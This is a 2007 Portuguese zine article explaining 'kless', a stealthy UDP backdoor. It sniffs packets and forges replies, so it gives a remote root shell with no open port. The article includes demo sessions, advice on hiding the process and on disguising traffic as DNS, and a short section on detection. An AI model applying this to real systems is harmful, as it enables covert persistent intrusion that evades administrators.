@@ -1,0 +1,679 @@
+[ --- The Bug! Magazine
+
+                    _____ _              ___               _
+                   /__   \ |__   ___    / __\_   _  __ _  / \
+                     / /\/ '_ \ / _ \  /__\// | | |/ _` |/  /
+                    / /  | | | |  __/ / \/  \ |_| | (_| /\_/
+                    \/   |_| |_|\___| \_____/\__,_|\__, \/
+                                                   |___/
+
+                      [ M . A . G . A . Z . I . N . E ]
+
+
+             [ Numero 0x02 <---> Edicao 0x01 <---> Artigo 0x03 ]
+
+
+
+.> 14 de Fevereiro de 2007,
+.> The Bug! Magazine < staff [at] thebugmagazine [dot] org >
+
+
+
+               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+               kless, connecting to void and getting out alive
+               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+.> 23 de Janeiro de 2007,
+.> setuid_ < setuid [at] promisc [dot] org >
+           < http://setuid.promisc.org >
+
+[ --- Indice
+
++     0.     <--->     Abstrato
++     1.     <--->     Introducao
++     2.     <--->     Principios de backdoor em user-land
++       2.1.  <->        Conectando a uma porta fechada
++     3.     <--->     Connection-less connection
++       3.1.  <->        sniff, sniff!!!
++       3.2.  <->        Escrevendo pacotes
++     4.     <--->     Implementacao
++     5.     <--->     kless-echo
++     6.     <--->     Jogando pimenta no caldinho de feijao
++     7.     <--->     kless-bd
++     8.     <--->     O jeito como poderia ser
++     9.     <--->     Nova fronteira: multiple binds, TCP, etc...
++     10.    <--->     Seguranca, e' possivel?
++     11.    <--->     Conclusao
++     12.    <--->     Referencias
+
+
+[ --- 0. Abstrato
+
+ Este documento procura demonstrar uma maneira  de implementar backdoors    (em
+ user-land) em um sistema, de forma que permita   a execucao remota de comandos
+ utilizando a suite TCP/IP, porem sem que seja necessario   abrir nenhuma porta
+ no servidor.
+ A comunicacao ocorre transparente para o cliente, enquanto o servidor simula a
+ pilha TCP/IP durante a execucao.  A intencao do texto e dos programas   desen-
+ volvidos como prova   de conceito e'  apontar as diversas maneiras pelas quais
+ e' possivel subverter a seguranca de um sistema.
+
+
+[ --- 1. Introducao
+
+ Backdoors sao a principal maneira pela qual um  atacante   mantem acesso  a um
+ sistema que tenha sido comprometido. A  evolucao deste tipo de artefato e' co-
+ mum e existem diversos  exemplos [1] sobre como eles podem ser  implementados,
+ e este documento propoe mais uma maneira ;). 
+   A intecao do texto e' implementar um modelo cliente/servidor para uma  back-
+ door que permita acesso remoto utilizando a suite   TCP/IP    (especificamente
+ UDP) porem  sem que nenhuma porta esteja efetivamente aberta no lado do   ser-
+ vidor em momento algum durante a comunicacao remota,  de maneira  que     isso
+ seja praticamente transparente para o cliente. 
+   A escolha sobre qual protocolo da camada de transporte utilizar na implemen-
+ tacao da backdoor e' exclusivamente ligado a complexidade de implementacao. 
+ Enquanto a implementacao utilizando TCP  e'  totalmente viavel,  simular a pi-
+ lha  TCP em todas/ou algumas de suas particularidades (tcp handshake,      re-
+ transmition, ack, syn, rst,  window size  advertisements, etc...) se torna uma
+ tarefa  altamente complexa  e   tediosa para o  simples proposito de uma back-
+ door. No entanto a simplicidade do UDP nos permite uma implementacao bem  mais
+ simplificada para a nossa prova de conceito, e serve o seu proposito de ser um
+ meio de transporte orientado a  datagramas sem  fornecer nenhum meio de garan-
+ tia sobre a   entrega  das mensagens ao destinatario.
+   O leitor deste texto nao precisa necessariamente ter familiaridade com    os
+ itens abaixo, mas facilitaria bastante a compreensao de certos trechos do  ar-
+ tigo:
+   - C [2]
+   - Suite TCP/IP de protocolos[3], a interacao entre os pro-
+     tocolos da camada de transporte e o protocolo de contro-
+     le ICMP [3][4]
+   - Construcao/captura de pacotes em user-land e bibliotecas  
+     existentes para este tipo de trabalho (libpcap, libnet).
+
+   Agradecimentos: dm, duhru@overt.org, todo  o pessoal do #0xff@freenode.net -
+ o ultimo endereco da internet ;).
+   
+ Vale ressaltar   que todos os exemplos   aqui listados   foram testados em  um
+ FreeBSD 6.2 e em um FreeBSD 6.1, mas a  maioria senao todos os  exemplos/casos
+ ilustrados devem funcionar nas demais distribuicoes UNIX disponiveis por ai.
+ O codigo fonte dos programas de prova de conceito utilizados no texto    estao
+ disponiveis em: http://setuid.promisc.org
+
+
+[ --- 2. Principios de Backdoors em user-land
+ 
+ Enquanto backdoors em kernel-land  conseguem suprir  e  ate'   mesmo superar a
+ capacidade e servicos fornecidos ao usuario,  as vezes e' impossivel manipular
+ o kernel    (seja por falta de conhecimento sobre o sistema, seja por falta de
+ codigo-fonte para utilizar - IBM AIX daria um bom exemplo deste  caso,    seja
+ ainda por outros motivos que nao precisam ser listados) o que nao permite    a
+ desqualificacao de backdoors em user-land mesmo apos toda a evolucao  ocorrida
+ nos ultimos 6 anos.
+   Em user-land a maioria das backdoors que  fornecem  acesso  remoto a maquina
+ ou sao desprovidos de qualquer meio de  esconder os rastros do acesso  (contam
+ com  a ineficiencia do administrador da maquina :), ou entao utilizam tecnicas
+ nas quais a conexao utilizada e' disponivel  apenas  atraves  de passos segui-
+ dos pelo cliente (port-knocking e' um bom  exemplo disso [5]). Ambos  os meios
+ mencionados acima  permitem que um administrador perceba alguma atividade sus-
+ peita   atravez de  simples comandos  administrativos   como    sockstat(1) ou
+ netstat(1), ou lsof.
+   A backdoor desenvolvida nesse texto subverte a maneira como simples  afirma-
+ coes relacionadas ao TCP/IP devem ser encaradas:
+
+   - Sempre que uma porta TCP/UDP estiver aberta necessaria-
+     mente deve haver um aplicativo recebendo/enviando dados
+     nessa porta (seja ele cliente ou servidor)
+   - Sempre que um administrador perceber uma porta aberta e'
+     possivel determinar qual aplicativo local esta conecta-
+     do a ela.
+   - Se uma porta nao estiver aberta nao pode haver  comuni-
+     cacao entrando ou saindo por ela.
+
+   A intencao do texto e'  subverter o significado das  duas primeiras  afirma-
+ coes e provar que e' possivel simular  para todos os efeitos situacoes na qual
+ a terceira afirmacao  se torne falsa.
+
+
+[ --- 2.1. Conectando-se a uma porta fechada
+
+ Enquanto o protocolo TCP fornece maneiras bem explicitas de    se verificar se
+ uma porta TCP esta aberta ou fechada  atravez de um reset (ACK/RST) no entanto
+ o UDP utiliza-se de outro mecanismo para notificar o evento de uma porta   fe-
+ chada:
+   Por exemplo, ao tentar enviar um  datagrama UDP para  uma  porta na qual nao
+ existe nenhum processo ouvindo,  o resultado e' o seguinte:
+
+ ---
+ setuid@zion$ nc -u 192.168.0.102 333
+ hello world
+ setuid@zion$
+ ---
+
+ ---
+ setuid@zion$ sudo tcpdump -i lo0 "ip proto \icmp or \udp"
+ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+ listening on lo0, link-type NULL (BSD loopback), capture size 96 bytes
+ 06:54:52.887388 IP 192.168.0.102.60490 > 192.168.0.102.333: 
+                 UDP, length 12
+ 06:54:52.887407 IP 192.168.0.102 > 192.168.0.102: 
+                 ICMP 192.168.0.102 udp port 333 
+                 unreachable, length 36
+ ---
+   Vale ressaltar que o cliente "nc" (netcat) termina a sua    execucao compul-
+ soriamente apos ser notificado que a  porta 333 esta fechada no host de desti-
+ no do pacote.
+   Ou seja, quando o kernel recebe um pacote, ele o  empura   pilha abaixo ate'
+ chegar ao header UDP do pacote quando e' possivel determinar a porta de desti-
+ no deste datagrama. O proximo passo e' determinar se existe algum processo es-
+ perando algum pacote naquela porta, no nosso caso nao existia nenhum processo,
+ entao o kernel envia de volta para o endereco de origem um pacote ICMP  infor-
+ mando que a  porta 333 e' "inalcancavel", ou seja,  nao existe ninguem  ouvin-
+ do naquela porta.
+   Esse e' o protocolo sobre   como informar  se uma porta UDP   esta' fechada.
+ Porem a especificacao no lado do cliente e' um pouco menos rigida, ela permite
+ que o cliente especifique se quer ou nao   ser notificado sobre o  recebimento
+ deste pacote ICMP informando que a porta de destino esta' fechada. Vamos ilus-
+ trar melhor sobre o caso:
+   Considere um cliente UDP simples que apenas envia o  que     for digitado no
+ stdin e espere por uma resposta do  servidor [6].   Basicamente os passos  que
+ um cliente UDP  deve executar sao:
+
+   - socket() - obtem um file descriptor para comunicacao
+   - captura o input via stdin (fgets(), etc..)
+   - sendto() - envia as informacoes recebidas do stdin
+   - recvfrom() - recebe as informacoes enviadas como res-
+		  posta.
+
+   Veja o output:
+ 
+ ---
+ setuid@zion$ ./udp-client setuid.ath.cx 333
+ hello world
+ ---
+
+ ---
+ setuid@zion$ sudo tcpdump -ni ath0 "ip proto \icmp or \udp"
+ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+ listening on ath0, link-type EN10MB (Ethernet), capture size 96 bytes
+ 07:21:39.225719 IP 74.52.16.40.49268 > 192.168.0.103.333: UDP, length 12
+ 07:21:39.225746 IP 192.168.0.103 > 74.52.16.40: ICMP 192.168.0.103 
+                 udp port 333 unreachable, length 36 
+ ---
+
+   Note que o cliente nao saiu como no primeiro teste usando o netcat mas ficou
+ esperando que a chamada recvfrom() retorna-se. A diferenca entre os dois apli-
+ cativos clientes explica a maneira como um cliente UDP e' notificado     sobre
+ a disponibilidade de uma porta ou nao. 
+   O 'netcat' faz apenas um passo a mais que o nosso cliente de exemplo   'udp-
+ client', ele faz uma chamada a  syscall connect(2). Isso e' um fato muito  in-
+ teressante das sockets BSD, quando uma socket e' usada com IPPROTO_TCP a  fun-
+ cao da chamada connect(2) e' realmente tentar estabelecer  uma   conexao entre
+ os dois pontos (fazendo o 3way handshake[3])  no entanto o significado do con-
+ nect(2)em uma socket IPPROTO_UDP e' outro. 
+   Em UDP nao existe o conceito de conectar-se a uma maquina ou estabelecer uma
+ conexao, na camada de transporte nao existe garantia alguma de que um   pacote
+ chegou ao destino, essa inteligencia deve ser implementada na camada do  apli-
+ cativo, como faz o TFTP [7].  Portanto  se um cliente  UDP chamar    a syscall
+ connect(2) o efeito e' diferente do obtido quando usando TCP.
+   Erros assincronos nao sao retornado para a sockets UDP a    nao ser que elas
+ tenham sido conectadas. Nao existe  handshake ou algo parecido, o kernel  sim-
+ plesmente guarda o par IP/Port do destinatario dos datagramas, por tanto quan-
+ do o sistema do destinatario receber o datagrama direcionado  a  porta fechada
+ e   enviar um ICMP port  unreachable para  a  origem, o kernel da origem veri-
+ fica se o IP/Porta  contido na mensagem ICMP esta'    armazenado devido a  uma
+ chamada connect(2), caso esteja ele retorna o erro para o processo   caso con-
+ trario o kernel silenciosamente descarta o  pacote ICMP.
+
+
+[ --- 3. Connection-less connection
+
+ Agora que ja sabemos como procede  o protocolo UDP  quando tenta se  comunicar
+ com uma porta fechada, nos ja'  podemos delinear quais sao os obstaculos   que
+ enfrentaremos    para fazer essa backdoor se tornar realidade:
+
+       - nao pode haver nenhuma porta aberta no servidor
+         que tenha relacao com a nossa comunicacao
+       - nos devemos ser capazes de receber as informacoes
+         que sao direcionadas a esta porta que vai estar
+	 fechada
+       - nos devemos ser capazes de responder aos pacotes
+         do cliente, de maneira que pareca que eles estao
+	 sendo enviados pela porta. Nos nao podemos  usar
+	 read, write, sendto, etc, uma vez que nao  temos
+	 nenhuma socket.
+       - o cliente deve ignorar os pacotes ICMP port  un-
+         reachable que serao recebidos uma vez que o ker-
+	 nel identificara que a nossa comunicacao esta' 
+	 direcionada para uma porta fechada.
+
+   Estes sao os nossos problemas,  uns sao faceis de  lidar outros nao, os pas-
+ sos mais cruciais sao  os passos  2 e  3  que envolvem simular   as funcoes de
+ read/write que  normalmente sao auxiliadas pelo uso de sockets.
+     
+    
+[ --- 3.1. sniff, sniff!!!
+
+ Quando um pacote chega ate um interface de rede (ethernet, wireless, ppp, etc)
+ ele e' empurrado pilha abaixo de  forma que o kernel vai analisando e  descar-
+ tando conforme  necessario o pacote, por exemplo: MAC   address no header  nao
+ e' o mesmo que a interface e a interface nao esta' em modo promiscuo - descar-
+ ta o pacote,   checksum do ip  header esta' incorreta -   descarta o pacote, e
+ assim por diante.
+   O que e' importante e' que e'  possivel utilizar  certas  interfaces para se
+ obter uma  copia dos pacotes  recebidos por uma ou todas as interfaces de rede
+ de um sistema. Essa copia e' independente do processamento real recebido  pelo
+ pacote, e' assim que funciona o tcpdump(1) e milhoes    de  outras ferramentas
+ existentes por ai.
+   Re-inventar a roda e' uma coisa feia de se fazer e algumas vezes resulta  em
+ rodas quadradas, retangulares,    e' ai  que bibliotecas como libpcap[8]   sao
+ extramamente uteis pois concetram em um unico local o esforco que seria   des-
+ centralizado e estaria fadado a ser incompleto.
+   
+   Por tanto acabamos de resolver uma grande parte do nosso problema,    nos ja
+ conseguimos com a libpcap ou com   qualquer outra maneira de "sniffar" os  pa-
+ cotes obter uma copia exata dos pacotes que sao direcionados para uma    porta
+ que esta' fechada. Outro ponto importante a ser ressaltado e' que devido a na-
+ tureza do protocolo UDP nos conseguimos obter o conteudo dos pacotes    (o que
+ realmente esta' sendo enviado em nossa direcao, a informacao em si, e nao  ca-
+ madas de protocolos) de uma so' vez e com um unico pacote, o   que poderia ser
+ diferente com o TCP.
+   Essa habilidade  ja' elimina  a necessidade  de abrirmos portas afim de  re-
+ ceber os dados que algum cliente   queira nos enviar. Vamos ver agora como li-
+ dar com a outra   parte do problema.
+
+
+[ --- 3.2. Escrevendo pacotes
+
+ A outra parte do nosso problema e' como enviar   eventuais    respostas para o
+ cliente (digamos que ele tenha enviado um comando whoami ou id por    exemplo)
+ nos queremos  conseguir enviar para ele o resultado do comando, afim de prover
+ uma interatividade de comunicacao.
+   A outra parte do problema e' solucionada tambem de   uma   maneira a nao re-
+ inventar a roda e denovo ganhar com  alta portabilidade, libnet [9]. 
+   Esta e' provavelmente  a  parte mais  simples do  codigo    pois nos   temos
+ todas as  informacoes relevantes a  nosso dispor: udp src/dst port, ip src/dst
+ address,   checksums,  payload, informacoes adicionais dos headers e etc...
+   E' so' uma questao de construir o pacote correto afim de simular uma respos-
+ ta legitima, que pareca ter vindo de uma porta, que de fato esta' fechada. Va-
+ le a pena  ressaltar que se nos estivessemos fazendo essa backdoor usando  TCP
+ nos teriamos acesso a todos os syn's e ack's e  tudo  mais o que permitiria de
+ maneira facil simular uma resposta autentica.
+   Agora que nos ja estabelecemos as nossas maneiras de ler e escrever um paco-
+ te (read/write ;)) vamos implementar um simples      exemplo para comecarmos a
+ brincar.
+
+
+[ --- 4. Implementacao
+
+ As funcoes basicas que nos devemos implementar sao as funcoes de read e write,
+ respectivamente, ler um pacote vindo da libpcap (usando pcap_loop()), e escre-
+ vendo um pacote de volta para a rede (usando libnet_write()).
+   O resto e' o resto, o que nos iremos fazer com os dados que foram transmiti-
+ dos varia muito de caso para caso, e e' similar a abstracao fornecida  por BSD
+ sockets, elas garantem a transmissao de dados e nao o que o seu  servidor/cli-
+ ente irao implementar. Por tanto   vamos fazer um  exemplo simples,  um servi-
+ dor echo.
+
+
+[ --- 5. kless-echo
+
+ Servidores echo sao uma verdadeira maravilha quando a  intencao e' se ter    o
+ menor trabalho possivel afim de demonstrar que uma comunicacao esta'   aconte-
+ cendo. Para quem   se interessar pode-se ler [10]. 
+   Kless-echo e' um servidor UDP que responde de volta para o cliente "qualquer
+ input que ele tenha recebido", o   seu codigo e' bem simples  e encontra-se em
+ [11].
+   Primeiro nos compilamos e executados o servidor:
+ ---
+ setuid@zion$ cd kless-echo/
+ setuid@zion$ ls
+ Makefile      README        kless-echo.c  udp-client.c
+ setuid@zion$ make
+ gcc kless-echo.c -o kless-echo -Wall -lpcap -lnet -L/usr/local/lib 
+     -I/usr/local/include/ `libnet-config --libs --defines`
+ gcc udp-client.c -o udp-client -Wall
+ setuid@zion$ sudo ./kless-echo -i ath0 -p 333 -d
+ setuid@zion$ sockstat -4 -p 333
+ USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS
+ setuid@zion$ netstat -an -p udp | grep 333
+ setuid@zion$
+ ---
+
+   Nos compilamos e executamos o kless-echo,   configuramos   ele para ouvir na
+ interface "ath0", aguardando pacote vindos para a porta 333/UDP  (talvez agora
+ seja um bom momento para mencionar que afim de nao recebermos todos os pacotes
+ nos usamos os filtros do BPF para determinar que  queremos   apenas os pacotes
+ filtrados pela seguinte regra: "udp dst port 333"), o -d coloca o nosso servi-
+ dor em background como um daemon. Note que nada aparece no output do sockstat,
+ do netstat...
+   Em outra maquina situada em outro ponto do planeta   nos  executamos um tcp-
+ dump(1) e o 'nc' ligeiramente alterado de forma a nao sair apos receber o ICMP
+  port unreachable.
+
+ ---
+ vlima@cerveau$ nc -u setuid.ath.cx 333
+ hello world          <--- input do cliente
+ hello world          >--- resposta do kless-echo
+ funcionou            <--- input do cliente
+ funcionou            >--- resposta do kless-echo
+ ^C punt!	      <--- control-c para sair do 'nc'
+ vlima@cerveau$
+ ---
+
+   As linhas que nos interessam do tcpdump rodando no  cliente sao: (os  comen-
+ tarios comecam com '#')
+
+ ---
+ vlima@cerveau$ sudo tcpdump -n -i rl0 "ip proto \udp or \icmp"
+ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+ listening on rl0, link-type EN10MB (Ethernet), capture size 96 bytes
+
+ 06:49:45.098391 IP 74.52.16.40.58307 > 12.96.160.115.53:  6756+ A? 
+                 setuid.ath.cx. (31)
+ 06:49:45.144893 IP 12.96.160.115.53 > 74.52.16.40.58307:  6756 1/5/5 A 
+                 201.53.69.175 (227)
+ # gethostbyname - resolvendo o endereco de IP 
+ # associado ao setuid.ath.cx
+
+ 06:49:49.728784 IP 74.52.16.40.65120 > 201.53.69.175.333: UDP, length 12
+ # enviados 12 bytes pela porta 65120/UDP para porta 333/UDP aonde esta'
+ # rodando o kless echo (hello world\n = 12bytes ;))
+
+ 06:49:49.934125 IP 201.53.69.175 > 74.52.16.40: ICMP 192.168.0.103 
+                 udp port 333 unreachable, length 36
+ # resposta do servidor rodando kless-echo indicando que a porta 333/UDP
+ # nao esta' aberta, note que e' um pacote ICMP
+
+ 06:49:49.937973 IP 201.53.69.175.333 > 74.52.16.40.65120: UDP, length 12
+ # resposta do kless-echo enviando de volta o que o cliente
+ # enviou (12 bytes) conforme aparece no output do netcat
+
+ 06:49:54.065045 IP 74.52.16.40.65120 > 201.53.69.175.333: UDP, length 10
+ # enviados 10 bytes pela porta 65120/UDP para porta 333/UDP aonde esta'
+ # rodando o kless echo (funcionou\n = 10bytes :))
+
+ 06:49:54.228556 IP 201.53.69.175 > 74.52.16.40: ICMP 192.168.0.103 
+                 udp port 333 unreachable, length 36
+ # resposta do servidor rodando kless-echo indicando que a porta 333/UDP
+ # nao esta' aberta, note que e' outro pacote ICMP
+
+ 06:49:54.232536 IP 201.53.69.175.333 > 74.52.16.40.65120: UDP, length 10 
+ # resposta do kless-echo enviando de volta o que o cliente
+ # enviou (10 bytes) conforme aparece no output do netcat
+ ---
+
+   Tambem  deixamos rodando um tcpdump(1) no servidor aonde  o kless-echo esta'
+ sendo executado, este e' o output:
+ ---
+ setuid@zion$ sudo tcpdump -n -i ath0 "ip proto \icmp or \udp"
+ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+ listening on ath0, link-type EN10MB (Ethernet), capture size 96 bytes
+ 10:48:11.178606 IP 74.52.16.40.65120 > 192.168.0.103.333: UDP, length 12
+ # recebidos os 12 bytes direcionados para a porta 333/UDP 
+ # (hello world\n = 12 bytes :))
+
+ 10:48:15.470810 IP 74.52.16.40.65120 > 192.168.0.103.333: UDP, length 10
+ # recebidos os 10 bytes direcionados para a porta 333/UDP
+ # (funcionou\n = 10 bytes ;))
+ ---
+
+   A interface de saida no servidor nao e' a mesma de  entrada, logo os pacotes
+ ICMP port unreachable e as respostas do echo-server so' aparecem na outra  in-
+ terface tambem rodando tcpdump(1):
+
+ ---
+ setuid@zion$ sudo tcpdump -n -i fxp0 "ip proto \icmp or \udp"
+ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+ listening on fxp0, link-type EN10MB (Ethernet), capture size 96 bytes
+ 10:48:11.178633 IP 192.168.0.103 > 74.52.16.40: ICMP 192.168.0.103 
+                 udp port 333 unreachable, length 36
+ # o kernel enviando o ICMP port unreachable para o cliente
+ # pois a porta 333/UDP nao esta' aberta
+ 
+ 10:48:11.180195 IP 192.168.0.103.333 > 74.52.16.40.65120: UDP, length 12
+ # a respota do kless-echo, enviando de volta os 12 bytes enviados pelo
+ # cliente.
+
+ 10:48:15.470836 IP 192.168.0.103 > 74.52.16.40: ICMP 192.168.0.103 
+                 udp port 333 unreachable, length 36
+ # o kernel enviando o ICMP port unreachable para o cliente
+ # depois de receber o segundo datagram.
+
+ 10:48:15.472310 IP 192.168.0.103.333 > 74.52.16.40.65120: UDP, length 10
+ # a resposta do kless-echo enviando de volta os 10 bytes do cliente.
+ ---
+
+   Ao que tudo indica o cliente esta' se comunicando   com  uma porta aberta, o
+ servidor acha que nao tem porta alguma aberta, e o kless-echo esta' funcionan-
+ do  independente de tudo isso ;)
+   Chegou a hora de nos fazermos a coisa ficar mais interessante, e se os  sim-
+ ples "hello world" fossem "whoami" e se ao invez de simplesmente repetir o que
+ foi recebido se ele executasse aquilo como um comando?
+
+
+[ --- 6. Jogando pimenta no caldinho de feijao
+
+ Quem gosta de caldinho de feijao sabe que o gosto e'  outro depois que    voce
+ joga 3 gotinhas de pimenta. Exatamente o que nos vamos fazer aqui. Basicamente
+ o  kless-echo foi uma pequena prova de conceito para ilustrar como  ira proce-
+ der a nossa backdoor. Ele implementou de maneira re-utilizavel  as  instrucoes
+ de read/write, so nos falta agora, preencher o miolo com uma maneira de execu-
+ tar os  comandos e receber a saida do mesmo.
+   O que nos precisamos e' de um canal de comunicacao  entre dois pontos,   que
+ seja bi-direcional em ambas as direcoes, ou seja, eu posso escrever/ler de  um
+ lado e do  outro tambem. Existem varias maneiras de se conseguir isso,     uma
+ delas e' a system call socketpair(2). 
+   Ao executar  essa syscall   nos temos dois  descritores que formam um par, a
+ segunda etapa e' criar um processo que execute os comandos recebidos. fork(2),
+ nos serve   a esse proposito muito bem, pois ainda tem a  vantagem   de herdar
+ os descritores ja' abertos,   entao a  comunicacao via  socketpair(2) fica ga-
+ rantida.   O terceiro passo e' duplicar os descritores  de entrada     e saida
+ desse   novo processo de maneira que nos podemos  ler/escrever no stdin/stdout
+ /stderr dele,   dup2(2)  nos oferece  essa  funcionalidade.   Ao duplicarmos o
+ descritor, nos o  amarramos a uma das sockets criadas com o socketpair(2)  as-
+ sim a comunicacao fica direta, o que for escrito no  socket   vai  sair direto
+ no stdin do processo criado e o inverso vale para o que for escrito no stdout,
+ que saira no file descriptor...
+   O ultimo passo vem ao executar "/bin/sh" via execve(2), ja' com todos os ho-
+ oks necessarios nos seus devidos lugares: Como os descritores stdin / stdout /
+ stderr ja foram duplicados para o nosso pipe com a execucao do /bin/sh nos te-
+ mos uma shell sendo executada e possuimos o controle do seu meio de    escrita
+ /leitura, so'  falta uma funcao    que execute os comandos, ou seja, envia pi-
+ pe abaixo um comando recebido e espere por alguns mili-segundos a resposta es-
+ sa por sinal e' a parte mais facil do codigo ;)
+
+
+[ --- 7. kless-bd
+
+ Ao prover as funcionalidades da secao anterior nos conseguimos transformar  um
+ codigo do kless-echo para uma backdoor funcional, vamos testa'-la:
+   
+ ---
+ setuid@zion$ l
+ Makefile    kless-bd.c
+ setuid@zion$ make
+ gcc kless-bd.c -o kless-bd -Wall -lpcap -lnet -L/usr/local/lib 
+                -I/usr/local/include/ `libnet-config --libs --defines`
+ setuid@zion$ sudo ./kless-bd -i ath0 -p 333 -d
+ Password:
+ setuid@zion$ sockstat -4 -p 333
+ USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS
+ setuid@zion$ netstat -an -pudp | grep 333
+ setuid@zion$
+ ---
+ 
+ Backdoor esta' rodando devidamente, vamos colocar os sniffers nos lugares cor-
+ retos para verificarmos a  comunicacao ocorrendo e tentar      executar alguns
+ comandos  remotamente.
+
+ ---
+ vlima@cerveau$ nc -u setuid.ath.cx 333
+ whoami            <--- comando digitado
+ root              >--- resposta recebida
+ uname -a          <--- comando digitado
+ FreeBSD zion 6.2-RELEASE FreeBSD 6.2-RELEASE #14: Wed Jan 24 10:37:58 
+         BRST 2007     
+ root@zion:/usr/obj/usr/src/sys/zion.kernel  amd64 >--- resposta recebida
+ ^C punt!
+ vlima@cerveau$
+ ---
+
+ Os nossos sniffers capturaram a seguinte acao ocorrendo na interface de entra-
+ da:
+
+ ---
+ setuid@zion$ sudo tcpdump -i ath0 -n "ip proto \icmp or \udp and port 333"
+ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+ listening on ath0, link-type EN10MB (Ethernet), capture size 96 bytes
+ 09:55:55.378125 IP 74.52.16.40.64582 > 192.168.0.103.333: UDP, length 7
+ # recebidos 7 bytes do comando "whoami\n"
+ 09:56:00.086185 IP 74.52.16.40.64582 > 192.168.0.103.333: UDP, length 9
+ # recebidos 9 bytes do comando "uname -a\n" 
+ ---
+
+ Agora as respostas do kless-bd pela interface de saida:
+ ---
+ setuid@zion$ sudo tcpdump -i fxp0 -n "ip proto \icmp or \udp and port 333"
+ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+ listening on fxp0, link-type EN10MB (Ethernet), capture size 96 bytes
+ 09:55:57.456356 IP 192.168.0.103.333 > 74.52.16.40.64582: UDP, length 5
+ # resposta ao comando "whoami" = "root\n" (5 bytes)
+ 09:56:02.163349 IP 192.168.0.103.333 > 74.52.16.40.64582: UDP, length 134
+ # resposta ao comando "uname -a"
+ ---
+
+   Isso quer dizer que agora nos temos umas backdoor totalmente funcional, con-
+ seguindo executar comandos com   a permissao de super-usuario,  pois ate' para
+ executar a backdoor e' preciso ter esse nivel de acesso ao sistema.
+   Agora existem algumas falhas dependentes do nosso modelo que tornam a  back-
+ door um pouco fragil, pontos aonde as coisas poderiam ser melhor.
+
+
+[ --- 8. O jeito como poderia ser 
+
+ Criptografia:
+ Toda a comunicacao poderia ser criptografada, de forma  a  esconder o conteudo
+ viajando pelos fios, isso faria   com que mesmo tendo a tentativa  de se ler o
+ conteudo dos  pacotes nao seria possivel enxergar ali nada de  significa tivo.
+ Existem diversas maneiras de se criptografar o trafego que seriam de aplicave-
+ is ao kless-bd.
+
+ Escondendo o processo:
+ Mesmo que nao seja listado nas saidas das ferramentas  comuns de procura   por
+ portas abertas no sistema  (sockstat, netstat, e etc..),  um simples "ps -axu"
+ revelaria o  processo sendo executado, portanto ao executar essa backdoor   e'
+ bom alterar o codigo dela para nao receber nenhum parametro de linha de coman-
+ do, que seja somente um ./cmd ou algo que seja nada suspeito, e ja ter as  op-
+ coes de  porta e interface embutidas no programa. O melhor seria   ainda  usar
+ o kless em conjunto com algum meio de se ocultar  a execucao de certos proces-
+ sos [12].
+
+ Emulacao total do terminal:
+ Apesar de ser algo extremamente dificil e nao portavel na   maioria das vezes,
+ isso seria uma otima funcionalidade de se ter. A  habilidade de  executar vir-
+ tualmente  qualquer programa console-based seria de  agrado para muitas   pes-
+ soas.
+ 
+
+[ --- 9. Nova fronteira: multiple binds, TCP, etc...
+
+ Uma coisa que o kless nos permite enxergar e' a possibilidade de se rodar mul-
+ tiplos processos ouvindo (da maneira como o kless ouve as coisas) na     mesma
+ porta. Isso   de maneira alguma representa alguma dificuldade de implementacao
+ na verdade e' so' uma questao de construir o  seu servidor de maneira a "simu-
+ lar" o application protocol do aplicativo que voce estiver emulando.
+   A utilidade principal disso seria poder utilizar portas    ja' abertas em um
+ firewall de forma a fazer a comunicacao entre o cliente e o servidor.    Outra
+ utilidade seria ocultar a comunicacao ocorrendo como trafico autorizado,    ou
+ na    pior das hipoteses como pacotes mal-construidos   ou  algum trafego ano-
+ malo, mas dificilmente como uma tentativa de ataque.
+   Deve-se tomar cuidado ainda com os possiveis logs gerados pelos  aplicativos
+ autenticos e como eles responderiam aos nossos pacotes "mal-comportados".
+   Bons servicos a serem alvos de um   multiple bind seriam DNS   (named) ou  o
+ TFTPD, se tornando apenas uma questao de adaptar o codigo ja existente      do
+ kless-bd para a peculiariedades dos seus protocolos a nivel  de    aplicativo,
+ seria bom utilizar-se por exemplo de peculiaridades  do proprio    aplicativo,
+ como no caso do DNS o campo de identificacao do seu cabecalho, e colocando  ao
+ invez de "enderecos"  a  serem resolvidos comandos a serem executados de forma
+ que a   backdoor em si   apenas execute o que vier com aquele ID,  e assim por
+ diante.
+   Implementar o kless ou algo similar utilizando  TCP e' uma tarefa viavel co-
+ mo ja foi dito no texto, porem tediosa e possivelmente  deve dar mais trabalho
+ do que utilidade mas existem casos em que se torna a unica opcao.   
+   Existem partes do protocolo  TCP que nao  precisam ser implementadas tornan-
+ do a construcao do codigo uma processo mais facil outra boa maneira seria  im-
+ plementar um cliente   de forma similar ao servidor (ouvindo por pacotes dire-
+ to  na interface e nao em uma porta utilizando  sockets)   dessa forma nao se-
+ ria necessario nem implementar o protocolo corretamente,     pois uma copia do
+ pacote (a que ficaria  no kernel) seria descartada, e o seu    cliente saberia
+ que se trata de um pacote destinado a ele, mesmo que nao     tenha por exemplo
+ o SYN correto  por exemplo,as  possibilidades sao imensas, resta experimentar.
+ 
+
+[ --- 10. Seguranca, e' possivel?
+
+ Obvio que para cada maneira de subverter a seguranca  de um sistema,     exis-
+ te uma maneira de se proteger e outra  de se subverter essa medida e     assim
+ por diante.
+   Se por um lado com o kless o administrador perde a  capacidade  de  utilizar
+ comandos como sockstat, ou   netstat afim de verificar a existencia de proces-
+ sos fazendo comunicacao via UDP, alguns patches podem ser aplicados ao  kernel
+ afim de verificar quais processos abriram o  /dev/bpf para leitura ou   alguma
+ coisa do genero [13].
+   O comando fstat em sistemas BSDs tambem indica que   um processo esta'com um
+ descritor aberto para o  /dev/bpfXX, ou ainda existem programas como o bpfstat
+ que e' capaz de ler essa informacao direto do kernel-land e mapear a  relacao:
+ processo -> interface no sistema.  
+
+
+[ --- 11. Conclusao
+
